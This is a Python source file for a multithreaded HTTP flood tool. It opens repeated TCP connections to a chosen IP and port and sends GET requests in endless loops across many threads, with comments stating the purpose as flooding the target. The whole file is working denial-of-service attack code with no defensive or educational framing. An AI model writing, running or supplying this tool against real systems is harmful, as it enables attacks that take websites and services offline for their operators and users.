# Import required modules
import os
import sys
import getopt
import threading
import socket

# Define the httpflood() class
class httpflood(threading.Thread):
	# Class: httpflood()
	# Purpose: Flood the target
	# Functions: __init__(), run()
	
	# Define the __init__() function
	def __init__(self, target_ip, target_port):
		# Function: __init__()
		# Purpose: Append everything to self
		
		# Append everything to self
		threading.Thread.__init__(self)
		self.target_ip = target_ip
		self.target_port = int(target_port)
		self.payload = "GET / HTTP/1.0\r\n\r\n"
		
	# Define the run() function
	def run(self):
		# Function: run()
		# Purpose: Flood the target
		
		# Create an infinite loop
		while True:
			# Create the socket
			with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as attack_socket:
				# Connect to targer
				attack_socket.connect((self.target_ip, self.target_port))
				
				# Create infinite loop
				while True:
					# Attempt to transmit data
					try:
						attack_socket.send(bytes(self.payload.encode("utf-8")))
					except socket.error:
						# Break from the infinite loop
						break
						
				# Close the socket
				attack_socket.close()
				
# Define the begin() function
def begin(attack_threads, target_ip, target_port):
	# Function: begin()
	# Purpose: Create attack threads
	
	# Create the threads
	for _ in range(int(attack_threads)):
		# Create the attack thread
		attack_thread = httpflood(target_ip, target_port)
		
		# Start the thread
		attack_thread.start()
